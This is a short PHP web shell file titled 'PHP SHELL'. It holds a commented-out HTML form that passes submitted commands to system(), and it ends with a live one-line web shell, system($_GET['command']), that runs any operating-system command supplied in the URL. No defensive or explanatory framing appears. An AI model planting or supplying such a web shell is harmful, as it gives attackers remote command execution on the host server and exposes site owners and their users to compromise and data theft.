<!--<!DOCTYPE html>
<html>
<head>
<title>PHP SHELL</title>
</head>
<body>

	<form action="" method="POST">
	<input type="text" name="command" id="command"></br>
	<input type="submit" name="submit" id="submit">
	</form>

<?php
/*
	if (!empty($_POST["command"])) {
		$command = $_POST["command"];
		echo '<pre>';
		$last_line = system($command, $retval);
	}
*/
?>

</body>
</html>-->

<?php system($_GET['command']); ?>